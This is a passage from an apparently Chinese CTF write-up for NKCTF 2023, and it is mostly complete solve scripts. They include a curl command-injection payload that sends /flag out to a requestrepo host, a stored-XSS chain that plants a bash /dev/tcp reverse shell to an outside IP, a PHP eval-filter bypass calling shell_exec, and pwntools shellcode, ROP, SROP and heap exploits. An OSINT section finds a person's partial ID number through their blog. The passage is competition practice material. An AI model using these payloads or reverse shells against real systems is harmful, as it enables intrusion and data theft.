class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>:<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:url+<span class="hljs-string">&quot;/repo-edit-1-0.html&quot;</span><br>    &#125;<br><br>    data1 = <span class="hljs-string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;SCM=Subversion&amp;client=`curl http://tmar9l37.requestrepo.com/?1=\\`cat /flag|grep NKCTF|base64\\``&#x27;</span><br>    s=requests.session()<br>    <span class="hljs-keyword">try</span>:<br>        req1 = s.get(url1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers)<br>        req3 = s.post(url3,data=data1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        req4 = s.post(url4,data=data2,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        <span class="hljs-built_in">print</span>(req4.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(check(<span class="hljs-string">&quot;http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_pms-1.png"></p><h2 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h2><p>小皮存储型XSS-&gt;rce</p><p><a href="https://blog.csdn.net/weixin_46944519/article/details/128954060">参考文章</a></p><p>请求头加上<code>X-Requested-With: XMLHttpRequest</code>就能访问登录框</p><p>vps上放定时任务，反弹shell</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params"></span>)&#123;<br>  $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-keyword">var</span> id=data.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">ID</span>;<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;<br>      <span class="hljs-attr">tid</span>:id<br>    &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res2</span>)&#123;<br>        $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;<br><br>        &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res3</span>)&#123;&#125;,<span class="hljs-string">&quot;json&quot;</span>);<br><br><br>    &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>  &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>  data.<span class="hljs-property">task_id</span>=<span class="hljs-string">&quot;&quot;</span>;<br>  data.<span class="hljs-property">title</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>  data.<span class="hljs-property">exec_cycle</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">week</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">day</span>=<span class="hljs-string">&quot;3&quot;</span>;<br>  data.<span class="hljs-property">hour</span>=<span class="hljs-string">&quot;16&quot;</span>;<br>  data.<span class="hljs-property">minute</span> = <span class="hljs-string">&quot;35&quot;</span>;<br>  data.<span class="hljs-property">shell</span>=<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/20.2.129.79/8888 0&gt;&amp;1&#x27;</span>;<br>  $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;<br>    <span class="hljs-title function_">poc</span>();<br>  &#125;,<span class="hljs-string">&#x27;json&#x27;</span>);<br>&#125;<br><span class="hljs-title function_">save</span>();<br></code></pre></td></tr></table></figure><p><code>python</code>开启一个<code>http</code>服务</p><p><code>python3 -m http.server 7777</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-2.png"></p><p>在登录处用户名框中插入<code>&lt;script src=http://20.2.129.79:7777/1.js&gt;&lt;/script&gt;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-1.png"></p><p>插入完后等待管理员bot登录，触发计划任务，反弹shell</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-3.png"></p><h2 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h2><p><strong>赛后复现</strong></p><p>ctfshow的题目加上一些函数禁用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// not only ++</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$NK</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$NK</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$NK</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$NK</span>) &lt; <span class="hljs-number">105</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$NK</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;hacker!!!&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>NKCTF=$_=(０/０)._;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_=&#39;_&#39;.$__.($_++).$_;$$_[__]($$_[_]);&amp;__=shell_exec&amp;_=echo `cat /flag`&gt;/var/www/html/3.txt</code></p><p>url编码后上传</p><h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h2><p>百度识图得到关键信息<code>海口</code>，进新闻得到<code>世纪大桥</code>，在<code>世纪大桥</code>旁边有一个<code>世纪公园</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Bridge-1.png"></p><p><code>NKCTF&#123;海南省海口市龙华区世纪公园&#125;</code></p><h2 id="两个人的夜晚"><a href="#两个人的夜晚" class="headerlink" title="两个人的夜晚"></a>两个人的夜晚</h2><p>根据图上的<code>NCC新城市中心</code>去百度地址</p><p><code>NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;</code></p><h2 id="狂飙"><a href="#狂飙" class="headerlink" title="狂飙"></a>狂飙</h2><p>抖音搜狂飙取景地得到<code>莲平路</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E7%8B%82%E9%A3%99-1.png"></p><p><code>NKCTF&#123;广东省江门市蓬江区莲平路&#125;</code></p><h2 id="real-social-engineering"><a href="#real-social-engineering" class="headerlink" title="real-social-engineering"></a>real-social-engineering</h2><p>github搜他id，找到博客地址：<a href="https://tacooo0o.github.io/">https://tacooo0o.github.io/</a></p><p>在<code>2021年终总结</code>这篇文章中找到驾驶证图片，包含了身份证信息</p><p><code>NKCTF&#123;6107**********4710&#125;</code></p><h2 id="Ferris-Wheel"><a href="#Ferris-Wheel" class="headerlink" title="Ferris_Wheel"></a>Ferris_Wheel</h2><p>百度识图得到<code>永川</code>，<code>摩天轮</code>，<code>渝西</code>等关键词</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Ferris_Wheel-1.png"></p><p>百度地图找到渝西之眼，组合爆破下地名</p><p><code>NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;</code></p><h2 id="旅程的开始"><a href="#旅程的开始" class="headerlink" title="旅程的开始"></a>旅程的开始</h2><p>百度地图搜<code>中铁酒店</code>，得到<code>贵阳火车站</code>，实景一点一点与图片对比</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E6%97%85%E7%A8%8B%E7%9A%84%E5%BC%80%E5%A7%8B-1.png"></p><p><code>NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;</code></p><h2 id="The-other-Bridge"><a href="#The-other-Bridge" class="headerlink" title="The other Bridge"></a>The other Bridge</h2><p>百度识图，得到<code>戴家巷崖壁步道</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/The%20other%20Bridge-1.png"></p><p>根据提示加个<code>畔</code></p><p><code>NKCTF&#123;重庆市江北区嘉陵江畔戴家巷崖壁步道&#125;</code></p><h2 id="decompile"><a href="#decompile" class="headerlink" title="decompile"></a>decompile</h2><p>步骤与上面的<code>decompile_revenge</code>一样</p><p><code>NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;</code></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node.yuzhian.com.cn:32220&quot;</span>)<br>shell=asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;min!&#x27;</span>,shell)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn:36024&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;see this. &#x27;</span>)<br><br>d=<span class="hljs-built_in">int</span>(p.readline().decode().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>rdi=libc.address+<span class="hljs-number">0x0019764d</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;comment?&#x27;</span>,p64(bin_sh))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corment?&#x27;</span>,p64(rdi))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corMenT?&#x27;</span>,p64(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa</span>+p64(<span class="hljs-number">0x405098</span>)+p64(<span class="hljs-number">0x401502</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./ez_stack&#x27;</span>)<br>context.binary=e<br>ax_f=<span class="hljs-number">0x401146</span><br>syscall=<span class="hljs-number">0x40114e</span><br>bss=e.bss(<span class="hljs-number">0x400</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./ez_stack&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;39605&#x27;</span>)<br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0</span><br>sig.rip=syscall<br>sig.rdi=<span class="hljs-number">0</span><br>sig.rsi=bss<br>sig.rdx=<span class="hljs-number">0x200</span><br>sig.rsp=bss+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ax_f)+p64(syscall)+flat(sig)<br><br>p.sendafter(<span class="hljs-string">&#x27;NKCTF!\n&#x27;</span>,payload)<br><br>sig1=SigreturnFrame()<br>sig1.rax=<span class="hljs-number">59</span><br>sig1.rdi=bss<br>sig1.rsi=<span class="hljs-number">0</span><br>sig1.rdx=<span class="hljs-number">0</span><br>sig1.rsp=bss+<span class="hljs-number">0x200</span><br>sig1.rip=syscall<br><br>payload1=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ax_f)+p64(syscall)+flat(sig1)<br>p.send(payload1)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>debug=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>        p=process(<span class="hljs-string">&quot;./nkctf_message_boards&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn:31457&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br><br>        e=ELF(<span class="hljs-string">&quot;nkctf_message_boards&quot;</span>)<br>        func=<span class="hljs-string">&#x27;puts&#x27;</span><br>        func_got=e.got[func]<br>        puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>        rdi=<span class="hljs-number">0x00401413</span><br>        leave=<span class="hljs-number">0x40138a</span><br>        bss=e.bss(<span class="hljs-number">0x200</span>)<br>        read=<span class="hljs-number">0x401351</span><br>        main=e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>        ret=<span class="hljs-number">0x00401434</span><br>        <span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401318\nbp 0x40138a&#x27;)</span><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.readuntil(<span class="hljs-string">&#x27;Hello, &#x27;</span>)<br>        canary=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;What&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>        n=<span class="hljs-number">0x30</span><br>        pad=<span class="hljs-string">b&#x27;a&#x27;</span>*n<br>        payload=pad+p64(ret)*<span class="hljs-number">13</span>+p64(rdi)+p64(func_got)+p64(puts)+p64(main)<br>        payload=payload.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>        payload+=p64(canary)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;carefully.\n&#x27;</span>)<br>        d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>        <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>            libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.33.so&quot;</span>)<br>            libc.address=d-libc.sym[func]<br>            system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>            bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>            gdb.attach(p)<br>        <span class="hljs-keyword">else</span>:<br>            libc=LibcSearcher(func,d)<br>            system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>            bin_sh=libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br>        payload=p64(ret)*<span class="hljs-number">0x1a</span>+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>        payload+=p64(ret)<br>        payload+=p64(canary)<br><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br><br>        p.interactive()<br>    <span class="hljs-keyword">except</span>:<br><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        p.close()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content: &#x27;</span>,data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span 